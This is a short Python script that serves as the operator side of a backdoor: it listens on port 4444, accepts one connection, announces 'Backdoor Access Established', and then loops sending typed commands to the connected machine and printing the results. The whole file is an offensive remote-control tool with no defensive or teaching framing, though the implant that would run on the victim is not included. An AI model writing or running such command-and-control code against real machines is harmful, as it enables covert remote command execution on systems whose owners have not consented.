import socket

HOST = '127.0.0.1'
PORT = 4444
server = socket.socket()
server.bind((HOST, PORT))
print('[+] Server Started')
print('[+] Listening ...')
server.listen(1)
client, client_addr = server.accept()
print(f'[+] {client_addr} Backdoor Access Established')

while True:
    command = input('Enter Command : ')
    command = command.encode()
    client.send(command)
    print('[+] Command sent')
    output = client.recv(1024)
    output = output.decode()
    print(f"Output: {output}")